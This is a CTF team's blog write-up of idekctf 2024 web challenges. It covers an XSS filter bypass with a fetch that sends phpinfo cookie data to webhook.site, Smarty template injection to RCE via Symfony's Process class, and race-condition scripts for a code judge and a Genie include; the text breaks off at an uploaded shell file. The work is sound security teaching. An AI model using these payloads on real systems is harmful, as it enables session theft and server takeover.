<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="idekctf 2024 Web Writeups" /><meta name="author" content="m0z" /><meta property="og:locale" content="en" /><meta name="description" content="We played idekctf as Ireland Without the RE and finished in 29th position. I only looked at the web challenges but they were really high quality and fun to play. In the end we solved 4/7 of these challenges." /><meta property="og:description" content="We played idekctf as Ireland Without the RE and finished in 29th position. I only looked at the web challenges but they were really high quality and fun to play. In the end we solved 4/7 of these challenges." /><link rel="canonical" href="https://ireland.re/posts/idekctf_2024/" /><meta property="og:url" content="https://ireland.re/posts/idekctf_2024/" /><meta property="og:site_name" content="Ireland.RE" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2024-08-19T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="idekctf 2024 Web Writeups" /><meta name="twitter:site" content="@LooseSecurity" /><meta name="twitter:creator" content="@m0z" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"m0z"},"dateModified":"2024-08-19T00:26:06+00:00","datePublished":"2024-08-19T00:00:00+00:00","description":"We played idekctf as Ireland Without the RE and finished in 29th position. I only looked at the web challenges but they were really high quality and fun to play. In the end we solved 4/7 of these challenges.","headline":"idekctf 2024 Web Writeups","mainEntityOfPage":{"@type":"WebPage","@id":"https://ireland.re/posts/idekctf_2024/"},"url":"https://ireland.re/posts/idekctf_2024/"}</script><title>idekctf 2024 Web Writeups | Ireland.RE</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Ireland.RE"><meta name="application-name" content="Ireland.RE"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /images/logo.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ireland.RE</a></div><div class="site-subtitle font-italic">Ireland Without the RE</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/members/" class="nav-link"> <i class="fa-fw ml-xl-3 mr-xl-3 unloaded"></i> <span>MEMBERS</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ECSCIreland" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/LooseSecurity" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['none','none.none'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>idekctf 2024 Web Writeups</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>idekctf 2024 Web Writeups</h1><div class="post-meta text-muted"><div> By <em> <a href="https://ctftime.org/team/179144">Ireland Without the RE</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1724025600" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-19 </em> </span> <span> Updated <em class="timeago" data-ts="1724027166" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2024-08-19 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1888 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><p>We played idekctf as Ireland Without the RE and finished in 29th position. I only looked at the web challenges but they were really high quality and fun to play. In the end we solved 4/7 of these challenges.</p><h1 id="webhello-161-solves">web/Hello (161 Solves)</h1><p>This was the first challenge I looked at. The flag is located in the bot’s cookie and our task is to steal it. We are given XSS with a basic filter.</p><h2 id="bypassing-the-xss-filter"><span class="mr-2">Bypassing the XSS filter</span><a href="#bypassing-the-xss-filter" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The content is sanitized using an <code class="language-plaintext highlighter-rouge">Enhanced_Trim</code> function as defined below:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">function</span>  <span class="n">Enhanced_Trim</span><span class="p">(</span><span class="nv">$inp</span><span class="p">)</span> <span class="p">{</span>
<span class="nv">$trimmed</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\r</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"</span><span class="se">\t</span><span class="s2">"</span><span class="p">,</span> <span class="s2">"/"</span><span class="p">,</span> <span class="s2">" "</span><span class="p">);</span>
<span class="k">return</span>  <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$trimmed</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nv">$inp</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This prevents us from using any closing tags. The next idea would be to use some sort of event handler but the lack of whitespace prevents the creation of attributes. Through manual fuzzing I discovered that it is possible to substitute in <code class="language-plaintext highlighter-rouge">%0c</code> form feeds. An example XSS payload would be <code class="language-plaintext highlighter-rouge">&lt;svg%0conload='alert()&gt;'</code>which provides us with an alert.</p><p>A 23 character substring is taken (which originally made me feel as though we needed a very short XSS payload) but this value is in fact never used.</p><h2 id="bypassing-httponly-flag"><span class="mr-2">Bypassing HTTPOnly flag</span><a href="#bypassing-httponly-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There exists a HTTPOnly flag on the cookie containing our flag. This is problematic as we cannot access it via <code class="language-plaintext highlighter-rouge">document.cookie</code> and must instead identify another way to solve the challenge. Notably, we are provided with another PHP file containing a call to <code class="language-plaintext highlighter-rouge">phpinfo()</code> which displays information relating to PHP along with the current user’s setting. This page will contain any cookies (even those with HTTPOnly set).</p><h2 id="bypassing-nginx"><span class="mr-2">Bypassing nginx</span><a href="#bypassing-nginx" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>So the idea thus far is to XSS the bot and have it fetch the phpinfo page containing the flag. However, there is the following nginx directive to consider:</p><div class="language-nginx highlighter-rouge"><div class="code-header"> <span data-label-text="Nginx"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">location</span> <span class="p">=</span> <span class="n">/info.php</span> <span class="p">{</span>
<span class="kn">allow</span> <span class="mi">127</span><span class="s">.0.0.1</span><span class="p">;</span>
<span class="kn">deny</span> <span class="s">all</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>This only allows requests from localhost. I had originally considered that the application must be running on a localhost port and would allow us to access it from the bot’s context (considering the bot source suggest a challenge URL of localhost:1337) but this is not the case. Eventually I realized we must find a bypass for this directive and a common trick is to append an allowed path to the disallowed one. Visiting<code class="language-plaintext highlighter-rouge">/info.php/index.php</code> will display the page.</p><h2 id="putting-it-all-together"><span class="mr-2">Putting it all together</span><a href="#putting-it-all-together" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>So we will make the bot fetch <code class="language-plaintext highlighter-rouge">/info.php/index.php</code> and then read the cookie. Unfortunately, the content of this page is massive and not easy to send over to a webhook. I decided to use some splits to make my payload a bit shorter.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">/info.php/index.php</span><span class="dl">"</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="o">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">text</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">x</span><span class="o">=&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="s2">`https://webhook.site/&lt;snip&gt;/</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">x</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">_COOKIE[</span><span class="se">\</span><span class="s2">'FLAG</span><span class="se">\</span><span class="s2">']</span><span class="dl">"</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nx">split</span><span class="p">(</span><span class="dl">"</span><span class="s2">$_SERVER</span><span class="dl">"</span><span class="p">)[</span><span class="mi">0</span><span class="p">])}</span><span class="s2">`</span><span class="p">))</span>
</pre></table></code></div></div><p>In the end I missed out on first blood by a few minutes :(</p><h1 id="webuntitled-smarty-challenge-13-solves">web/untitled-smarty-challenge (13 Solves)</h1><p>The next challenge we solved was this PHP challenge running the Smarty template system. It’s a pretty small challenge (again) which I enjoy seeing. The source code is as follows:</p><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span>  <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Smarty\Smarty</span><span class="p">;</span>
<span class="nv">$smarty</span> <span class="o">=</span> <span class="k">new</span>  <span class="nc">Smarty</span><span class="p">();</span>

<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">gettype</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">===</span> <span class="s1">'string'</span><span class="p">)</span> <span class="p">{</span>
	<span class="nv">$file_path</span> <span class="o">=</span> <span class="s2">"file://"</span>  <span class="mf">.</span>  <span class="nb">getcwd</span><span class="p">()</span> <span class="mf">.</span>  <span class="s2">"/pages/"</span>  <span class="mf">.</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
	<span class="nv">$smarty</span><span class="o">-&gt;</span><span class="nf">display</span><span class="p">(</span><span class="nv">$file_path</span><span class="p">);</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: /?page=home'</span><span class="p">);</span>
<span class="p">};</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>We can see that it will accept any file we pass and consider it a Smarty template. This strongly hints towards some sort of SSTI. It is also worth noting that an <code class="language-plaintext highlighter-rouge">open_basedir</code> directive exists which only allows PHP to read within the <code class="language-plaintext highlighter-rouge">/app</code> directory. This means that, unless we find a bypass, we can’t do any fancy PHP session trickery to get our template file onto the server.</p><h2 id="finding-ssti"><span class="mr-2">Finding SSTI</span><a href="#finding-ssti" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Pretty quickly after running the docker I noticed a <code class="language-plaintext highlighter-rouge">/app/templates_c</code> directory spawned. Analyzing its contents it would appear that each time a template is rendered by Smarty it will be compiled into a PHP file and written to this directory. I noticed that it contains value from the URL which were directly written to the PHP file (but escaped).</p><p>The files are only created if a template is rendered so we need a proper path containing our SSTI payload. The first thing I tried was <code class="language-plaintext highlighter-rouge">/?page=../{system('ls')}/../pages/home</code> which rendered the home template successfully and wrote a file to <code class="language-plaintext highlighter-rouge">/app/templates_c</code> which contained our SSTI payload. Testing locally, I copied the name of this file that was created and I loaded it in <code class="language-plaintext highlighter-rouge">/?page=../templates_c/FILE_NAME_HERE</code> and I could see that my template was interpreted! Unfortunately, this application is running Smarty 5 and the system call is no longer considered valid.</p><h2 id="finding-a-valid-ssti-payload"><span class="mr-2">Finding a valid SSTI payload</span><a href="#finding-a-valid-ssti-payload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This proved quite tricky since it appears Smarty developers decided to deprecate any tags which previously would have allowed RCE. They removed <code class="language-plaintext highlighter-rouge">include_php</code> along with <code class="language-plaintext highlighter-rouge">system</code> and <code class="language-plaintext highlighter-rouge">php</code> tags. Eventually gg0h noticed that you can call static methods like so:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{assign var=foo value=\Path\To\Folder::StaticMethod()}
</pre></table></code></div></div><p>We also noticed that the Dockerfile was suspiciously installing symfony but not actually using it. It became clear that we would find a useful gadget inside the symfony install that we could leverage for RCE.</p><h2 id="getting-rce"><span class="mr-2">Getting RCE</span><a href="#getting-rce" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>The method we found was <code class="language-plaintext highlighter-rouge">\Symfony\Component\Process\Process::fromShellCommandline</code> which allows you to run shell commands. <img data-src="https://i.imgur.com/ChM4ApT.png" alt="enter image description here" data-proofer-ignore> The final issue was retrieving the payload. We needed a way to callback to our URL but slashes and dots were not working when passed in through the URL. An earlier observation when reading documentation revealed the following idea:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>{include file="eval:base64:&lt;baseblob&gt;"}
</pre></table></code></div></div><p>So we could simply base64 encode our RCE payload and the evaluate it like above.</p><h1 id="webcrator-63-solves">web/crator (63 Solves)</h1><p>This web challenge allowed us to run our own Python code against a number of test cases to solve some programming problems.</p><h2 id="initial-observations"><span class="mr-2">Initial observations</span><a href="#initial-observations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>When running <code class="language-plaintext highlighter-rouge">print(__builtins__)</code> we could see that the <code class="language-plaintext highlighter-rouge">open()</code> function is left exposed. This would allow us to interact with the filesystem. Additionally, we could see that the flag was saved as the expected output of the challenge.</p><p>Expected output is saved to a file in <code class="language-plaintext highlighter-rouge">/tmp/{SUBMISSION_ID}.expected</code> which is deleted after the checks are made. Test cases are skipped if previous test cases fail and so we need the first one to pass.</p><h2 id="finding-the-exploit"><span class="mr-2">Finding the exploit</span><a href="#finding-the-exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>To get the test case with the flag to run, we need to ensure that the first test case passes. We can see that the expected output is “Welcome to Crator” which can be read from <code class="language-plaintext highlighter-rouge">input()</code> on the HelloInput challenge. Once this initial test case returns this expected value it will run the test case containing the flag.</p><p>To ensure we always pass this test case I wrote the following initial line:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">x</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
<span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="s">"Welcome to Crator"</span><span class="p">:</span>
	<span class="k">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</pre></table></code></div></div><p>We can then put all of our logic for the flag test case into an else clause. Once this initial test passes, the flag should be written to <code class="language-plaintext highlighter-rouge">/tmp/{SUBMISSION_ID}.expected</code> but we cannot read this because of the following line:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">if</span>  <span class="nb">file</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">submission_id</span>  <span class="o">+</span>  <span class="s">".expected"</span><span class="p">):</span>
	<span class="k">raise</span>  <span class="nb">RuntimeError</span><span class="p">(</span><span class="s">"Nein"</span><span class="p">)</span>
</pre></table></code></div></div><p>I found it interesting that it doesn’t just block us reading all files appended with <code class="language-plaintext highlighter-rouge">.expected</code> and instead checks the current <code class="language-plaintext highlighter-rouge">submission_id</code> also. This means that other submission threads could read this file and thus we can solve this using a race condition.</p><p>The rest of the solution is implementation details which I won’t delve into too much but the general idea is to instantiate a number of submissions which will all try to read the expected value of another process and print it. Since the output of our first test case isn’t hidden, we can use this to leak it. Below is my solution script.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">concurrent.futures</span>

<span class="n">num</span> <span class="o">=</span> <span class="mi">34</span>
<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"code"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"""s = ""
x = input()
while True:
    if x == "Welcome to Crator":
        print(x)
        break
    x = open('/tmp/</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">.expected').read()
    if len(x) &gt; 0:
        s = x
        print(s.strip())
        break"""</span>
<span class="p">}</span>

<span class="n">data2</span> <span class="o">=</span> <span class="p">{</span><span class="s">"code"</span><span class="p">:</span> <span class="sa">f</span><span class="s">"""# import math # jk, you can't import

for _ in range(100):
    for i in range(</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s">, </span><span class="si">{</span><span class="n">num</span><span class="o">+</span><span class="mi">10</span><span class="si">}</span><span class="s">):
        try:
            x = open(f"/tmp/</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">.expected").read()
            if len(x) &gt; 0:
                print(x)
        except:
            pass"""</span><span class="p">}</span>

<span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"session"</span><span class="p">:</span> <span class="s">"eyJ1c2VyX2lkIjoyLCJ1c2VybmFtZSI6IngifQ.ZsH2aQ.g3JTvNLbop3sPpV4TyuLZ2vAmdQ"</span>
<span class="p">}</span>

<span class="k">def</span> <span class="nf">send_request</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">"https://crator-cf849282e9c800ca.instancer.idek.team/submit/helloinput"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookies</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">r</span>

<span class="k">with</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">11</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
    <span class="n">futures</span> <span class="o">=</span> <span class="p">[</span><span class="n">executor</span><span class="p">.</span><span class="n">submit</span><span class="p">(</span><span class="n">send_request</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">)]</span>
    <span class="n">futures</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">executor</span><span class="p">.</span><span class="n">submit</span><span class="p">(</span><span class="n">send_request</span><span class="p">,</span> <span class="n">data2</span><span class="p">))</span>
    
    <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">concurrent</span><span class="p">.</span><span class="n">futures</span><span class="p">.</span><span class="n">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">):</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">future</span><span class="p">.</span><span class="n">result</span><span class="p">()</span>
        <span class="k">print</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></table></code></div></div><h1 id="webincludeme-5-solves">web/includeme (5 Solves)</h1><p>This challenge was really fun. We are given a Julia project using the Genie web framework. Then we are given full control over the value passed into an <code class="language-plaintext highlighter-rouge">include()</code> function. This reminds me of the old PHP LFI2RCE challenges and all of the creative ways people managed to write data to the filesystem.</p><h2 id="finding-arbitrary-file-upload"><span class="mr-2">Finding arbitrary file upload</span><a href="#finding-arbitrary-file-upload" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>In the Genie project there exists a test file which provides an example of a Genie server with file upload functionality: https://raw.githubusercontent.com/GenieFramework/Genie.jl/master/test/fileuploads/test.jl</p><p>On our docker container this file is located at <code class="language-plaintext highlighter-rouge">/home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl</code> and by including it we add 2 additional routes for GET and POST. The former overwrites our LFI include endpoint and the latter allows us to upload a file to the filesystem.</p><p>The obvious problem is that although we can now upload a file wherever we want; we can no longer include it since the route has been overwritten.</p><h2 id="more-race-conditions"><span class="mr-2">More race conditions</span><a href="#more-race-conditions" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Eventually through trial and error I decided to test a minimalistic race condition scenario. By sending 2 concurrent requests; one to load the test file and another to load app.jl containing our original route. There is a 50% chance that the app.jl will arrive and be processed just after the test.jl and if this is the case then it will once again overwrite the GET method. However, now we still have the POST endpoint allowing our file upload.</p><p>This is because Genie doesn’t remove the old routes; you can continue to declare new ones. The newest route which matches a request will overwrite all the others. I’m not entirely sure how the race condition works but my guess is that at the time of arrival Genie decides which route will handle it and then it gets queued until it is able to process it (since async is set to False). If anyone with more in-depth knowledge of this has a better explanation then please ping me on Discord. :)</p><p>My solution was to run:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span><span class="p">,</span> <span class="n">as_completed</span>

<span class="n">urls</span> <span class="o">=</span> <span class="p">[</span>
    <span class="s">"https://includeme-7b130afe2e790952.instancer.idek.team/?page=../home/ctf/.julia/packages/Genie/yQwwj/test/fileuploads/test.jl"</span><span class="p">,</span>
    <span class="s">"https://includeme-7b130afe2e790952.instancer.idek.team/?page=app.jl"</span>
<span class="p">]</span>

<span class="k">def</span> <span class="nf">fetch_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">url</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span>

<span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
    <span class="n">futures</span> <span class="o">=</span> <span class="p">[</span><span class="n">executor</span><span class="p">.</span><span class="n">submit</span><span class="p">(</span><span class="n">fetch_url</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span> <span class="k">for</span> <span class="n">url</span> <span class="ow">in</span> <span class="n">urls</span><span class="p">]</span>
    
    <span class="k">for</span> <span class="n">future</span> <span class="ow">in</span> <span class="n">as_completed</span><span class="p">(</span><span class="n">futures</span><span class="p">):</span>
        <span class="n">url</span><span class="p">,</span> <span class="n">status_code</span><span class="p">,</span> <span class="n">content</span> <span class="o">=</span> <span class="n">future</span><span class="p">.</span><span class="n">result</span><span class="p">()</span>
</pre></table></code></div></div><p>If the application page still displays <code class="language-plaintext highlighter-rouge">hello, world</code> then our race condition has worked! In this instance, we may now send a POST request with our file to be uploaded. I used the following <code class="language-plaintext highlighter-rouge">shell.jl</code> file:</p><div class="language-julia highlighter-rouge"><div class="code-header"> <span data-label-text="Julia"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="k">using</span> <span class="n">Pkg</span>
<span class="n">Pkg</span><span class="o">.</span><span class="n">activate</span><span class="x">(</span><span class="s">"."</span><span class="x">)</span>

